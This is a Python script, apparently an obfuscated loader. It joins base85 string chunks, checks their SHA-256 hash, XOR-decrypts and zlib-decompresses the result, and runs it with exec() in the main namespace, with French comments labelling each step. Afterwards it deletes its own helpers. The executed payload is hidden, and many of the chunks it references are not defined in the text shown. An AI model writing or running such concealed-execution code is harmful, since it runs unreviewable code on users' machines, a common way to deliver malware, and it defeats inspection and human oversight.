_ct1nZe2H7MA48X = 'CU*@$idEKh?EG;JZp!Ea<H-;-aFk0s@1eJGOu&c>&3P3='
_cuL90BgBMGzlJJ = 'TYN}T=gmqQBaiu(VRP^%E`8T~CozC<hm1%JVz3+D?u7%Y'
_cmfWRspEpJpzQS = '30HUp-Ufv7;FaIF70<uO>C7?#{F2U{=m9@^ouk5@#$$P@'
_crRMGf95hAGZm0 = 'PT6EGn%+#jDVb;zy^52F?5*&Rh`dRgiR{O)+M3%!71^lu'
_ccE5oM7dlS5vzX = 'bD+5jB{f3x+-G<yD~~$HR!Hb&h&sRyN4Md%uGlcZS_cKH'
_criLQEPizEoeJv = 'L5Tl-^$Rme*U=!&Qn03akQZX4Slw@Fx_BQs=^<4Hq!}^o'
_crRp2vPgvmnTzv = 'zuzV_%WFB7t&doffTw9xn1P_E_d;%;Mhtb3a~}c2D7RNB'
_czHzSA5RQ4ZmYR = '5KO0HMG1ElKVW}s0y@aYb>>-!-3B#{jt6QGiJ)S-PKI_A'
_ciO7ihxljkWetJ = '%qJ!ZTRTg4`f!$f;iKXz=Eb(_J+~tk1NF^VLn##vdDZrB'
_cokWooiHztx24s = 'gQxl`2(b-m4aYFXTeUi?3;Lg@=+sOPV)DLm1}Ea{I@t`>'
_ct0fXZ7F_42s7u = 'h?CVIN!@CM<1t6)fF;$0wytzQ&^R`U1Tbn3IbA|t(Ry>{'
_cgcQa9GPIzSpje = 'Fo?K3ST?sRYj$TiLPW)fxfaZE=6tUA`!-?XkZzP6B9VhA'
_cpams0KhTrv8Gb = ';!q}`di5R_uCH_5z6uEmb|@%F(hN5LfM4xTdX6Kn{eFz^'
_capxkkPiZTbZPV = 'GkfZjefxKh{jLxoZM@DzK>?Q>ypjqHtQ#R%U@RM*R$Rt@'
_ccenownY0kI1Y9 = 'F+Ydl@GE-bo`gnRY#HJCE7_h*vM+Np{M}bIpi^C2cvy>&'
_cze3dgEaqN5KRM = 'YY~?owYAP^VE%(v9d#6a5+~0g0RgYE>Czu8a=w<eiSTxI'
_ccelOHfie5gQ2D = 'm6w|U!!6rE1D_Km#f=UL`7uu?St8y&T;Lt=^u<>6Byq%`'
_cuinZRkfY1rSAd = '8%#?MZ3w)>S@os~tc^Qd?h}7TrXC)3IYbsG##&u9!n7hh'
_crz6d64feVq2xS = 'z&r!oO~0Zauo{@XZ4O?$n40sS#v>SsknJYdNG@3*=>AZQ'
_cirUanA1tHyiNH = 'ja-n%El{g`_faERKbd5<42GkJ&chd!_iZGOi7Y0x(<k>4'
_ceRadmkTrWYf2M = 'EkF_F={SG;jYHulT2Q{<;k%PapGV2;1QQcaZNdEYqQj3~'
_choDIlRw5gtFI0 = 'BZ40Qf-0mo(d7;G;I`R-av5h-W(1=o{&WZn7)_l4_{za1'
_cvgfTvfnIYTSNx = 'IjJ|Z>|_6{>{fh^FoT$+zlwF&UvP(F=|1}*h9F&ANDUP?'
_cvhp8VjQQBlzI2 = 'oP{ZwZ>Izi_~b{Xtq$_xxHckeoD_ni1)M6x1Shk+vx8<0'
_cyT3DkULMMOY4T = '&IY>P648AZa4H8ROgh_<HHvvGd!|*U`+H6T3aFXAT5(nu'
_cflmZOgJVtJr8L = 'j<VVcfwOyctF;mYULRUQZz>fw4}w_7IChSy`}Cd{8~G9)'
_cbDxrhnqiBT_Ts = 't!_n?i1g8TyPtuk$iDDlR^xuDQ(eV*dcNbVH?l_ou^GR3'
_clFIWJvJlzyWvZ = '^JCeLHAiR8Ir(nU7H@Kii>8qQB6%n;F~PD1-t%Q11C&S0'
_csmcb93kUkjQAY = '2nc;&w|Oe*YS_fdTp%vH?)^+pB*nq$R~~GnSE}8-x>)xT'
_caju3iDOHRU4fS = 'Gub$=#WhW0NXP0$_Pes&pUld+gA&c2Le|TFi921GvWW8<'
_ctXQwzI8GOI25o = 'fvE%YH8f$@5rSWZ!p|I8g%Ybr)YFmjaNf4KhaY4@oke#N'
_cvM5eOCsLvkIp1 = 'yI)(qp-wSI7H>$WnSB'

_pfBgrKsCLmdYMA = __import__('base64').b85decode(_cob0_cBSMDipQ4 + _ctxW019G_9F8Tx + _cz0CauvKHiEuZV + _ccH6kl3taFO6jA + _cbykT6Gq0UiFaJ + _civeGpEW8E1H9i + _ckW1Zn7xREycT1 + _ckNiyiYeO8UEH7 + _cs2dKQaokLJ8vj + _cnidh7_WpKLnE8 + _caCQZt9AMtAxfV + _cr1v8Bv994xHdK + _crQ6DmYKX3CZEC + _ciI_qROIKugqw8 + _clxHyuqBco1tq2 + _chtWD4VcCkDbJ7 + _cwuNUjRyoVwfne + _cnjbprFQlnkfRj + _cqQCbxpAi6rCOa + _cn3gnWMqs68cBG + _ctFbRbfT217LFW + _cazBByQSObVSCc + _cjQAnGtMqyOQ3c + _cxCgOvG1CJdb1i + _crOlXrOpIRaHDE + _cpv5qUM05N3kvA + _cgemxnJ57M4kqV + _cbYWbAyaR_3aqw + _ctbjIrMv0k1_tc + _cm9wEz3yQrcBD1 + _cfDGamjCK7X6cs + _ckP8eVr1t7xSx4 + _cxwFBVdESgtW0q + _cv1p1AsEbjn8EB + _ctW1XNTRP0NHo7 + _c_DULU5AHSv8br + _csHT5L97HBeTfs + _cqgU_Q6JhQgcuu + _cyjRlmMPwpsSQP + _cbSwhaCKK5_3RG + _cxDlOWr4oPormB + _c_koe0L3h_oGnM + _cx38LxiSgIpjPp + _cxiiIkcBTcsqNz + _cbcPD_73fWJrPp + _cjRBHbPc8p6czv + _cwLCPl27NCaJGG + _cj_9w_Mt8jVOL4 + _cpBfcCEyIK4WJT + _ccVdRRzbVJLOm6 + _cj3Ee8xluBOcYu + _cnyy8gycoXFVE8 + _cnMB6cSNjvqytH + _cwH2_V_FNfZKeR + _cskzOzoA7MsRpO + _cjaSSE042zrAVP + _cj0f_ZTZ2DjsC7 + _cqX8rrkE4x052Q + _ca4OtsgnwUXzIs + _c_h5XlZKNZZH3d + _ckLp7rMhTeKwmt + _cvqAosfea9E1Tx + _c_p3t4Mgy28DZd + _cf5yQO5dEXMuzA + _ccF0CyoV3GcwCT + _cc8KPgZN4liJXV + _cn6M7kBzPAkzid + _czhocu1DUINXTE + _cdUQZ3WT0_hMJ5 + _citw39tSrfuSqh + _ce_fVDjMc6Npln + _cod8IZAibZTtbZ + _ccNCsOTxDTWEtA + _csmBpyGQB2wvON + _cywc8E5yRs44lB + _cx1VoqHe7jdKPO + _cvekklTBm0rZzD + _cdsU_MDT3NBUc6 + _cvjGltXqv0iIwY + _cfhiCHjFv8IKdN + _c_wAbNwtSVG2gj + _cooVZG1ib2D1ir + _cajWgwvObEVRUo + _coyIAAZsIumDq3 + _cmhYvYLASZnuK3 + _cm3YKwywNabt58 + _cyYFNJKxCtug6F + _ccJVAEneyuVGm1 + _ccyEyMLifnQxdT + _cwNy6CvqI6uvz0 + _cfsQckJTChmkHy + _cbSLwU3_r7pkYO + _cnKeZVa1dR9kT_ + _cvnrU_IjjxeXPo + _cnPfMbuZdaqo6F + _cqHOrTOCSH6n3X + _cdtx212vzHggz8 + _chQNRD94LsI_59 + _cg3nZ81vrD_uAX + _cmlz3llk88xW_J + _cxRTC_85LMsNX8 + _clrToRLxZ3hcjg + _csX_u8SD6i3snp + _cnNmdq4wMpxOV8 + _cnyrqMxf4780rg + _cdqPpOKLsLnFiv + _coLcHu9AzvZTfU + _cmUagMCokHZOkh + _clP0oRojjEjX75 + _ceG62yP444uDXG + _cmHCBWzERf4c8Y + _cgapoxgGhFLGMi + _cwDG9ECriXOjHW + _cfouRcEHgCocKU + _cza1EgXaeehJ1l + _ceM5_1N2t9uvP0 + _chk2sRdKbxM1Dn + _c_rhHepziiNTXc + _cvQpOxxtybhbhF + _cuNDE7hTI76w3u + _cutwMbbnlj04En + _cxOWICtFPRPtNE + _cevGpPfC2P2_wZ + _ce4KXd4oZsvqoe + _cr7hQWFp1lLUs9 + _cnpWP6LzEy44FA + _clmrkxq_4KCn7b + _ckulD47aaQJIVi + _cy_Ry7C76g9ptq + _cr7lVkf9dSsVFA + _cnHChkAFHor2SY + _coUny_RHtzd6mF + _ca_iQw0D7juBDz + _clYKDc8Dc_wOYn + _cmz5Pt7hftTeBY + _cdXmTKa4q62bMb + _cqVfGg6z8inxnW + _cp7hnMFM5f4dcd + _ckb1W3lx3yMNUj + _cjqTKWSjUDEZ0M + _cigfgjVCE6tcyO + _cvWuKxPNad9E1f + _ciNJJtVQAyKibB + _cgZo369UAGfhkU + _ck9oIo1Wmrr6N9 + _chjxjSkOhorMfg + _cyOF4BykguwtCc + _cfPaU3Tftk9KiW + _cvCT9VK2eTXczk + _cvGo_IFGQrjwaS + _ca4_36Frxifggc + _ciiaivjTIdRuSn + _caWZAfrV9PaLDB + _coPE6JwFMFj3JM + _cnaGIU7dJkbMt5 + _cha5vCB5DHBHee + _cdfemYJ6j492n3 + _cg5WJAmNgVa4hi + _cgpbjRItIRtAh9 + _cfZMD_FEkZClVD + _cz4Ns9vQdwOsJY + _cy7sboqgpa9qGg + _cmUED2ZxR9bIyB + _cjuxi9x1guR2XN + _csWkOKum39VD7K + _cswOk8LR_e_bYf + _ca1Rc8gkmyh8xr + _cdUwE7dIGH9uaO + _ckdt3QvP0Vjv6s + _cxTfxE0WfxzwFY + _caT_MI6Oe104Bk + _c_tZTzLS1a1216 + _caRgm7Gd00vGhA + _cmAe7KYLBsKk1j + _cyRCkR31BCWA4E + _cqz4EilC4akj5S + _cjSFYXAXv5lVtk + _cqCDG5mFfPSTOB + _coko8Z5ZhyGKo0 + _cxOF1x1MBF7uL_ + _cvwW7Z6J7gFS76 + _cu4hDFqTwgx_xz + _cqWM9dfsyIYSdY + _crIhTjN5cvLYDy + _ceSyNueJ67P95d + _ckv4lBUo36qiM4 + _cgqYHDAYWt2R04 + _csf70p4Sfy5RCJ + _cxJe7W6jAVoUqB + _cjuOC9gxLu3HJc + _ciyqli1NhTXDlz + _czywBFgqcm_zve + _cyeGq3Xd3SstaR + _coKtqjKtO0MEN3 + _c_Fu2L7ArEEqX_ + _cvFzqT6Q5cYrIp + _ciBPpxOjDIe_xD + _cvT7xnHrkKK7mT + _csDEqNtrIMGBNw + _cdhxUvm4mLaZnf + _c_EKBlSt7dSXk0 + _cvcdXMwOfqsbSp + _ciaI0S0ZyhA7Tn + _csXIVIhHOA8Ju0 + _cgAFCoZoIzOHsW + _chbdsWazdLxUdy + _coKPPpFGIjFAll + _cx5saEPqixGLJJ + _coVVKcV8VXKKzu + _cuazg5gm42C7ED + _ca2fje9FhFdCYy + _cdwio4AKiG23Mr + _cdRiXA9UxQSOtn + _cambQ6KxxwSRTk + _c_7QNQ6i5LtpaG + _cz2g1P2obc75jv + _cdxdnzWkap8SJo + _cd37xaNv_IMKr3 + _cx6Xz51rfbYqnO + _cfVR6WvSk1SIum + _cr9_won0wEVs66 + _cjKS3iwh3P7SPO + _c_D77wDj4HLuDD + _cjYC1DqYDe_SyA + _cvfXuxPUewmgEf + _ct1nZe2H7MA48X + _cuL90BgBMGzlJJ + _cmfWRspEpJpzQS + _crRMGf95hAGZm0 + _ccE5oM7dlS5vzX + _criLQEPizEoeJv + _crRp2vPgvmnTzv + _czHzSA5RQ4ZmYR + _ciO7ihxljkWetJ + _cokWooiHztx24s + _ct0fXZ7F_42s7u + _cgcQa9GPIzSpje + _cpams0KhTrv8Gb + _capxkkPiZTbZPV + _ccenownY0kI1Y9 + _cze3dgEaqN5KRM + _ccelOHfie5gQ2D + _cuinZRkfY1rSAd + _crz6d64feVq2xS + _cirUanA1tHyiNH + _ceRadmkTrWYf2M + _choDIlRw5gtFI0 + _cvgfTvfnIYTSNx + _cvhp8VjQQBlzI2 + _cyT3DkULMMOY4T + _cflmZOgJVtJr8L + _cbDxrhnqiBT_Ts + _clFIWJvJlzyWvZ + _csmcb93kUkjQAY + _caju3iDOHRU4fS + _ctXQwzI8GOI25o + _cvM5eOCsLvkIp1)
if __import__('hashlib').sha256(_pfBgrKsCLmdYMA).hexdigest() != '31942eaa23441cecb7c586d1ef9b367344c86c824a1c43d91dc6ebd27fa3beef':
    __import__('sys').exit(1)
_xdfFtRBXHaJmR0 = bytes([112, 120, 216, 34, 74, 205, 134, 9, 233])
_fka4XqSBZZzPCNx = bytes([213, 56, 216, 182, 184, 150, 80, 100, 54])

def _fxvo5KQGVLiKv2y(_blUXnGiqJYN7Ri, _kzwvTiCxicULT8):
    return bytes(_blUXnGiqJYN7Ri[_irEnshT2fRg6Tg] ^ _kzwvTiCxicULT8[_irEnshT2fRg6Tg % len(_kzwvTiCxicULT8)] for _irEnshT2fRg6Tg in range(len(_blUXnGiqJYN7Ri)))

def _fdu6so_vAe8Uz_b(_tqwPWl0_zB3fgm):
    import zlib
    return zlib.decompress(_tqwPWl0_zB3fgm) # Un seul niveau de zlib ici pour simplifier

def _fenLu_GmgmxbTBT():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfPNzjUhfLBlLX = _fxvo5KQGVLiKv2y(_pfBgrKsCLmdYMA, _xdfFtRBXHaJmR0)
    # 2. Décompression Zlib
    _dbm8DbUHiqxCTT = _fdu6so_vAe8Uz_b(_xfPNzjUhfLBlLX)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dbm8DbUHiqxCTT.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nlSgnQaAoBuAGM = _main.__dict__
    _nlSgnQaAoBuAGM.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nlSgnQaAoBuAGM)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fenLu_GmgmxbTBT()
try:
    del _fxvo5KQGVLiKv2y, _fdu6so_vAe8Uz_b, _fenLu_GmgmxbTBT
    del _pfBgrKsCLmdYMA, _xdfFtRBXHaJmR0, _fka4XqSBZZzPCNx
except:
    pass
